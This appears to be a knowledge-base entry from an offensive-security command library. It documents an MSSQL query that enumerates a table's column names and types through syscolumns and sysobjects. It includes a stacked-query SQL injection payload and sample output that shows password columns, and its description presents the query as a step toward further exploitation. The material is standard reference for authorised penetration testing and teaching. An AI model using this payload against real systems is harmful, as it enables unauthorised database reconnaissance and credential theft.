---
type: command
executor: sql
data: >-
  SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
  master..syscolumns, master..sysobjects WHERE master..syscolumns.id =
  master..sysobjects.id AND master..sysobjects.name = '$_TABLE_NAME';
tags:
  - sql-injection
  - mssql
  - discovery
platforms:
  - MSSQL
verified: true
validated: true
---

# mssql-list-column-names-and-types-for-table

## Command

```sql
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id = master..sysobjects.id AND master..sysobjects.name = '$_TABLE_NAME';
```

## Description

This SQL command retrieves both the names and data types of columns for a specified table in the master database of an MSSQL instance. It joins syscolumns and sysobjects to provide detailed schema information, useful for identifying sensitive data types in SQL injection attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TABLE_NAME | The name of the target table (e.g., 'sometable') | Yes |

## Examples

### Basic Usage

```sql
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id = master..sysobjects.id AND master..sysobjects.name = 'sometable';
```

### In Stacked Query

```sql
; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id = master..sysobjects.id AND master..sysobjects.name = 'sometable' --
```

## Expected Output

Pairs of column names and their types, for example:

```
name        TYPE_NAME
----------- ----------
id          int
username    varchar
password    varchar(255)
```

Successful execution in an injection context will display this in the response, aiding further exploitation.

## Related

- [[procedures/List-MSSQL-Table-Columns-via-SQL-Injection]]
- [[commands/mssql-list-column-names-for-table]]
